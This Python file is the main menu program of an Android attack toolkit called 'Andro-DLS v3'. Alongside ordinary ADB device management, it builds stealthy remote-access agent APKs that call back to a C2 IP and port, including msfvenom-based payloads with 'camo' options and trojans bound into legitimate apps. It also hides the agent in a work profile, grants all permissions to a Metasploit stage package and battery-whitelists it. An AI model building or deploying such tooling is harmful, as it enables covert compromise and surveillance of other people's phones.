"""Andro-DLS v3 — Main CLI with guided setup and device management."""

from __future__ import annotations

import os
import shutil
import subprocess
import json
import random
import time
from pathlib import Path

from rich.console import Console
from rich.panel import Panel

from modules import banner, color
from modules.console import console, ask, confirm, adb, print_error, print_success, print_warning
from modules.config import AppConfig
from modules.tools import resolve_external_tools, set_adb_executable


def _project_root() -> Path:
    return Path(__file__).resolve().parent.parent


# ─── Dependency check (simplified) ─────────────────────────────────────────

def check_adb(config: AppConfig) -> bool:
    """Check if ADB is available."""
    if shutil.which("adb"):
        config.adb_path = "adb"
        return True
    if config.adb_path and Path(config.adb_path).is_file():
        return True
    print_error("ADB not found. Run: bash install.sh --yes")
    return False


# ─── Device Store ──────────────────────────────────────────────────────────

DEVICES_FILE = ".payload-build/devices.json"


def save_device(serial, name="", ip="", last_seen=""):
    """Save device to store."""
    root = _project_root()
    path = root / DEVICES_FILE
    path.parent.mkdir(parents=True, exist_ok=True)
    devices = []
    if path.exists():
        try:
            devices = json.loads(path.read_text())
        except Exception:
            devices = []

    # Update existing or add new
    for d in devices:
        if d.get("serial") == serial:
            d["name"] = name or d.get("name", "")
            d["ip"] = ip or d.get("ip", "")
            d["last_seen"] = last_seen or time.strftime("%Y-%m-%d %H:%M")
            path.write_text(json.dumps(devices, indent=2))
            return

    devices.append({
        "serial": serial,
        "name": name,
        "ip": ip,
        "last_seen": last_seen or time.strftime("%Y-%m-%d %H:%M"),
    })
    path.write_text(json.dumps(devices, indent=2))


def load_devices():
    """Load saved devices."""
    root = _project_root()
    path = root / DEVICES_FILE
    if path.exists():
        try:
            return json.loads(path.read_text())
        except Exception:
            return []
    return []


# ─── USB Setup (Option 1) ─────────────────────────────────────────────────

def usb_setup(config: AppConfig):
    """Guided USB → wireless setup."""
    console.print(Panel(
        "[bold green]USB → WIRELESS SETUP[/bold green]\n\n"
        "This will switch your phone from USB ADB to wireless ADB.\n"
        "After this, you can remove the cable — everything works over WiFi.",
        title="Step 1", border_style="green"
    ))

    # Check ADB
    if not check_adb(config):
        return

    # Check if any device is connected via USB
    out, rc = adb("devices")
    if rc != 0:
        print_error("ADB not responding")
        return

    lines = out.strip().split("\n")[1:]  # Skip header
    usb_devices = [l.split()[0] for l in lines if "device" in l and "offline" not in l]

    if not usb_devices:
        console.print("\n[yellow]No USB device found.[/yellow]")
        console.print("\n[dim]1. Connect your phone via USB cable[/dim]")
        console.print("[dim]2. Enable USB debugging on phone:[/dim]")
        console.print("   [dim]Settings → About Phone → Tap 'Build Number' 7 times[/dim]")
        console.print("   [dim]Settings → Developer Options → USB Debugging → ON[/dim]")
        console.print("[dim]3. Accept the USB debugging prompt on phone[/dim]")
        console.print("\n[yellow]Then try again.[/yellow]")
        return

    device = usb_devices[0]
    console.print(f"\n[green]✓[/green] Found device: [cyan]{device}[/cyan]")

    # Get device info
    model, _ = adb("-s", device, "shell", "getprop", "ro.product.model")
    android, _ = adb("-s", device, "shell", "getprop", "ro.build.version.release")
    console.print(f"  [dim]{model} · Android {android}[/dim]")

    # Ask to proceed
    if not confirm("\nSwitch this device to wireless ADB (tcpip 5555)?"):
        console.print("[yellow]Cancelled.[/yellow]")
        return

    # Switch to wireless
    console.print("\n[cyan]Switching to wireless ADB...[/cyan]")
    out, rc = adb("-s", device, "tcpip", "5555")
    if rc != 0:
        print_error(f"tcpip failed: {out}")
        return
    console.print(f"[green]✓[/green] {out}")

    # Wait for switch
    console.print("[dim]Waiting 3 seconds...[/dim]")
    time.sleep(3)

    # Get WiFi IP
    console.print("[cyan]Getting WiFi IP...[/cyan]")
    ip_out, _ = adb("-s", device, "shell", "ip", "-f", "inet", "addr", "show", "wlan0")
    ip = ""
    for line in ip_out.split("\n"):
        if "inet " in line:
            # Format: inet 192.168.1.100/24 ...
            parts = line.strip().split()
            for p in parts:
                if p.startswith("192.168.") or p.startswith("10.") or p.startswith("172."):
                    ip = p.split("/")[0]
                    break

    if not ip:
        console.print("[yellow]Could not get WiFi IP. Enter it manually:[/yellow]")
        ip = ask("[cyan]Phone IP[/cyan] > ").strip()

    console.print(f"\n[green]✓[/green] Phone WiFi IP: [bold cyan]{ip}[/bold cyan]")

    # Connect wirelessly
    console.print("\n[cyan]Connecting wirelessly...[/cyan]")
    out, rc = adb("connect", f"{ip}:5555")
    console.print(f"[dim]{out}[/dim]")

    if rc == 0 and "connected" in out.lower():
        console.print(f"\n[bold green]✓ SUCCESS![/bold green] Device connected at [cyan]{ip}:5555[/cyan]")
        console.print("[dim]You can now remove the USB cable.[/dim]")

        # Get device name
        name = ask("\n[cyan]Name for this device (e.g. 'My Phone')[/cyan] > ").strip() or "Unknown"

        # Save to device store
        save_device(serial=f"{ip}:5555", name=name, ip=ip)
        console.print(f"[green]✓[/green] Device saved as: [cyan]{name}[/cyan]")

        console.print("\n[bold green]Next:[/bold green] Go to [cyan]Option 2[/cyan] (Connected Devices) to manage it.")
    else:
        print_warning(f"Connection may have failed. Try: adb connect {ip}:5555")


# ─── Connected Devices (Option 2 submenu) ──────────────────────────────────

def list_devices(config: AppConfig):
    """Show all connected + saved devices."""
    console.print(Panel("[bold cyan]CONNECTED DEVICES[/bold cyan]", border_style="cyan"))

    # Live devices
    out, rc = adb("devices")
    if rc == 0:
        lines = out.strip().split("\n")[1:]
        live = [l.split()[0] for l in lines if "device" in l and "offline" not in l]

        if live:
            console.print("\n[green]● Live Devices:[/green]")
            for d in live:
                model, _ = adb("-s", d, "shell", "getprop", "ro.product.model", timeout=5)
                console.print(f"  [green]✓[/green] [cyan]{d}[/cyan] — {model or 'Unknown'}")
        else:
            console.print("\n[yellow]No live devices connected.[/yellow]")

    # Saved devices
    devices = load_devices()
    if devices:
        console.print("\n[dim]── Saved Devices ──[/dim]")
        for i, d in enumerate(devices, 1):
            status = "[green]●[/green]" if d.get("serial") in live else "[red]○[/red]"
            console.print(f"  {status} [white]{i}.[/white] {d.get('name', 'Unknown')} ({d.get('serial', '?')})")
            console.print(f"      [dim]IP: {d.get('ip', 'N/A')} · Last seen: {d.get('last_seen', '?')}[/dim]")
    else:
        console.print("\n[dim]No saved devices. Run Option 1 (USB SETUP) first.[/dim]")


def connect_device(config: AppConfig):
    """Pick a saved device and connect to it."""
    devices = load_devices()
    if not devices:
        console.print("[yellow]No saved devices. Run Option 1 (USB SETUP) first.[/yellow]")
        return

    console.print("[cyan]Saved Devices:[/cyan]")
    for i, d in enumerate(devices, 1):
        console.print(f"  [white]{i}.[/white] {d.get('name', 'Unknown')} ({d.get('serial', '?')})")

    choice = ask("\n[cyan]Which device[/cyan] > ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
        print_error("Invalid choice")
        return

    d = devices[int(choice) - 1]
    ip = d.get("ip", "")
    serial = d.get("serial", "")

    if not ip:
        print_error("No IP saved for this device")
        return

    console.print(f"\n[cyan]Connecting to {d.get('name')} at {ip}:5555...[/cyan]")
    out, rc = adb("connect", f"{ip}:5555")
    console.print(f"[dim]{out}[/dim]")

    if rc == 0 and "connected" in out.lower():
        console.print(f"[green]✓ Connected to {d.get('name')}[/green]")
        save_device(serial=f"{ip}:5555", name=d.get("name"), ip=ip)
    else:
        print_warning(f"Connection failed. Is the device on the same network?")


def reconnect_last(config: AppConfig):
    """Reconnect to the most recently used device."""
    devices = load_devices()
    if not devices:
        console.print("[yellow]No saved devices.[/yellow]")
        return

    last = devices[-1]
    ip = last.get("ip", "")
    if not ip:
        print_error("No IP saved")
        return

    console.print(f"[cyan]Reconnecting to {last.get('name')} at {ip}:5555...[/cyan]")
    out, rc = adb("connect", f"{ip}:5555")
    console.print(f"[dim]{out}[/dim]")

    if rc == 0 and "connected" in out.lower():
        console.print(f"[green]✓ Reconnected[/green]")
    else:
        print_warning("Reconnection failed")


def device_info(config: AppConfig):
    """Show detailed info for a device."""
    out, rc = adb("devices")
    if rc != 0:
        print_error("ADB not responding")
        return

    lines = out.strip().split("\n")[1:]
    live = [l.split()[0] for l in lines if "device" in l and "offline" not in l]

    if not live:
        console.print("[yellow]No devices connected.[/yellow]")
        return

    # If multiple, ask which one
    if len(live) > 1:
        console.print("[cyan]Multiple devices:[/cyan]")
        for i, d in enumerate(live, 1):
            console.print(f"  {i}. {d}")
        choice = ask("\n[cyan]Which[/cyan] > ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(live):
            serial = live[int(choice) - 1]
        else:
            serial = live[0]
    else:
        serial = live[0]

    # Gather info
    console.print(f"\n[cyan]Device Info: {serial}[/cyan]\n")

    props = [
        ("Model", "ro.product.model"),
        ("Manufacturer", "ro.product.manufacturer"),
        ("Android", "ro.build.version.release"),
        ("API Level", "ro.build.version.sdk"),
        ("CPU", "ro.product.cpu.abi"),
        ("Brand", "ro.product.brand"),
    ]

    for label, prop in props:
        val, _ = adb("-s", serial, "shell", "getprop", prop, timeout=5)
        console.print(f"  [white]{label}:[/white] {val or 'N/A'}")

    # Battery
    bat_out, _ = adb("-s", serial, "shell", "dumpsys", "battery", timeout=5)
    for line in bat_out.split("\n"):
        if "level:" in line:
            level = line.split(":")[1].strip()
            console.print(f"  [white]Battery:[/white] {level}%")
            break

    # WiFi IP
    ip_out, _ = adb("-s", serial, "shell", "ip", "-f", "inet", "addr", "show", "wlan0", timeout=5)
    for line in ip_out.split("\n"):
        if "inet " in line:
            for p in line.strip().split():
                if p.startswith(("192.168.", "10.", "172.")):
                    console.print(f"  [white]WiFi IP:[/white] {p.split('/')[0]}")
                    break


def pull_apks(config: AppConfig):
    """Run the APK extractor."""
    console.print(Panel("[bold cyan]APK EXTRACTOR[/bold cyan]\n\nPulling all installed APKs from device...", border_style="cyan"))

    if not check_adb(config):
        return

    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[yellow]No device connected.[/yellow]")
        return

    # Run the extractor module
    from modules.usb_apk_extractor import run_extractor
    run_extractor()


def grant_permissions(config: AppConfig):
    """Grant all permissions to the agent package."""
    console.print(Panel("[bold cyan]PERMISSION MANAGER[/bold cyan]\n\nGranting all runtime permissions to agent...", border_style="cyan"))

    PKG = "com.metasploit.stage"

    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[yellow]No device connected.[/yellow]")
        return

    from modules.usb_permissions import grant_permissions as gp, ALL_PERMISSIONS
    count = gp(PKG, "all")
    if count > 0:
        # Battery whitelist
        adb("shell", "dumpsys", "deviceidle", "whitelist", f"+{PKG}")
        console.print(f"\n[green]✓[/green] {count} permissions granted + battery whitelisted")


# ─── Build Agent (Option 3 submenu) ────────────────────────────────────────

def build_pure(config: AppConfig):
    """Build pure agent APK."""
    console.print(Panel("[bold magenta]PURE BUILD[/bold magenta]\n\nNo msfvenom — most stealthy.", border_style="magenta"))

    lhost = ask("[cyan]C2 IP (your LAN IP or 10.0.2.2 for emulator)[/cyan] > ").strip()
    lport = ask("[cyan]C2 Port (default 4445)[/cyan] > ").strip() or "4445"

    if not lhost:
        print_error("IP required")
        return

    root = _project_root()
    out = root / "androdls-agent.apk"
    cmd = ["bash", str(root / "build_agent_pure.sh"), lhost, lport, str(out)]

    console.print(f"\n[cyan]Building...[/cyan]")
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
    print(r.stdout)
    if r.returncode != 0:
        print(r.stderr)
        print_error("Build failed")
    else:
        print_success(f"APK built: {out}")


def build_enhanced(config: AppConfig):
    """Build enhanced agent APK."""
    console.print(Panel("[bold magenta]ENHANCED BUILD[/bold magenta]\n\nmsfvenom base + 6-layer injection.", border_style="magenta"))

    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]C2 Port (default 4445)[/cyan] > ").strip() or "4445"

    if not lhost:
        print_error("IP required")
        return

    root = _project_root()
    out = root / "androdls-enhanced.apk"
    cmd = ["bash", str(root / "build_payload_enhanced.sh"), "--agent", "--camo", "--fgs", lhost, lport, str(out)]

    console.print(f"\n[cyan]Building...[/cyan]")
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
    print(r.stdout)
    if r.returncode != 0:
        print(r.stderr)
        print_error("Build failed")
    else:
        print_success(f"APK built: {out}")


def build_trojan(config: AppConfig):
    """Bind agent into a legitimate APK."""
    console.print(Panel("[bold magenta]TROJAN BIND[/bold magenta]\n\nInject agent into a legitimate APK.", border_style="magenta"))

    legit = ask("[cyan]Path to legitimate APK[/cyan] > ").strip()
    if not legit or not Path(legit).exists():
        print_error("APK not found")
        return

    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]C2 Port (default 4445)[/cyan] > ").strip() or "4445"

    if not lhost:
        print_error("IP required")
        return

    root = _project_root()
    out = root / "trojan.apk"
    cmd = ["bash", str(root / "bind_payload.sh"), legit, lhost, lport, str(out)]

    console.print(f"\n[cyan]Building trojan...[/cyan]")
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
    print(r.stdout)
    if r.returncode != 0:
        print(r.stderr)
        print_error("Build failed")
    else:
        print_success(f"Trojan APK built: {out}")


def deploy_work_profile(config: AppConfig):
    """Deploy agent via hidden work profile."""
    console.print(Panel("[bold magenta]WORK PROFILE DEPLOY[/bold magenta]\n\nHidden profile with cross-resurrection.", border_style="magenta"))

    # Need APK path
    apk = ask("[cyan]Agent APK path (or press Enter for latest build)[/cyan] > ").strip()
    root = _project_root()

    if not apk:
        # Try latest build
        pure = root / "androdls-agent.apk"
        enhanced = root / "androdls-enhanced.apk"
        if pure.exists():
            apk = str(pure)
        elif enhanced.exists():
            apk = str(enhanced)
        else:
            print_error("No APK found. Build one first (Option 3 → 1 or 2)")
            return

    if not Path(apk).exists():
        print_error(f"APK not found: {apk}")
        return

    from modules.work_profile import deploy
    deploy(apk)


def deploy_to_device(config: AppConfig):
    """Install agent + grant perms + launch on connected device."""
    console.print(Panel("[bold magenta]DEPLOY TO DEVICE[/bold magenta]\n\nInstall + grant all permissions + launch agent.", border_style="magenta"))

    # Find APK
    root = _project_root()
    apk = ask("[cyan]APK path (or Enter for latest)[/cyan] > ").strip()
    if not apk:
        for name in ["androdls-agent.apk", "androdls-enhanced.apk", "payload_enhanced.apk"]:
            p = root / name
            if p.exists():
                apk = str(p)
                break

    if not apk or not Path(apk).exists():
        print_error("No APK found. Build one first.")
        return

    # Run deploy script
    cmd = ["bash", str(root / "deploy_agent.sh"), apk]
    console.print(f"\n[cyan]Deploying {apk}...[/cyan]")
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
    print(r.stdout)
    if r.returncode != 0:
        print(r.stderr)
        print_error("Deploy failed")
    else:
        print_success("Agent deployed and launched")


# ─── Main dispatch ─────────────────────────────────────────────────────────

_selected_banner = ""


def _pick_banner():
    c = random.choice(color.color_list)
    return f"[bold {c}]{random.choice(banner.banner_list)}[/bold {c}]"


def display_menu(config: AppConfig, page=0):
    global _selected_banner
    console.print(_selected_banner)
    if page < len(banner.menu):
        console.print(banner.menu[page])
    else:
        console.print(banner.menu[0])


def clear_screen(config: AppConfig, page=0):
    os.system(config.clear_cmd)
    display_menu(config, page)


def start(config: AppConfig) -> None:
    Path("Downloaded-Files").mkdir(exist_ok=True)
    resolve_external_tools(config)
    set_adb_executable(config.adb_path)


# ─── Menu routing ──────────────────────────────────────────────────────────

def handle_main_menu(config: AppConfig, option: str) -> str:
    """Handle main menu options. Returns next page or 'main'."""
    match option:
        case "0":
            config.run = False
            console.print("\n[white]Exiting...[/white]\n")
            return "exit"
        case "1":
            usb_setup(config)
            return "main"
        case "2":
            return "devices"
        case "3":
            return "build"
        case _:
            console.print("\n[red]Invalid selection![/red]\n")
            return "main"


def handle_devices_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            list_devices(config)
        case "2":
            connect_device(config)
        case "3":
            reconnect_last(config)
        case "4":
            device_info(config)
        case "5":
            pull_apks(config)
        case "6":
            grant_permissions(config)
        case _:
            console.print("\n[red]Invalid selection![/red]\n")
    return "devices"


def handle_build_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            build_pure(config)
        case "2":
            build_enhanced(config)
        case "3":
            build_trojan(config)
        case "4":
            deploy_work_profile(config)
        case "5":
            deploy_to_device(config)
        case _:
            console.print("\n[red]Invalid selection![/red]\n")
    return "build"


def main(config: AppConfig) -> None:
    current_page = "main"
    page_num = 0

    while config.run:
        try:
            clear_screen(config, page_num)

            option = ask(f"[red]\\[{current_page.upper()}][/red] > ").strip().lower()

            if current_page == "main":
                result = handle_main_menu(config, option)
                if result == "exit":
                    break
                elif result == "devices":
                    current_page = "devices"
                    page_num = 1
                elif result == "build":
                    current_page = "build"
                    page_num = 2
            elif current_page == "devices":
                result = handle_devices_menu(config, option)
                if result == "main":
                    current_page = "main"
                    page_num = 0
            elif current_page == "build":
                result = handle_build_menu(config, option)
                if result == "main":
                    current_page = "main"
                    page_num = 0

            # Pause for reading
            if config.run:
                ask("\n[dim]Press Enter to continue...[/dim]")

        except (KeyboardInterrupt, EOFError):
            config.run = False
            console.print("\n[white]Exiting...[/white]\n")
        except Exception as e:
            console.print(f"\n[red]Unexpected error:[/red] {e}\n[yellow]Back to main menu.[/yellow]\n")
            current_page = "main"
            page_num = 0


def run() -> None:
    global _selected_banner
    config = AppConfig()
    start(config)
    _selected_banner = _pick_banner()
    clear_screen(config, 0)
    main(config)
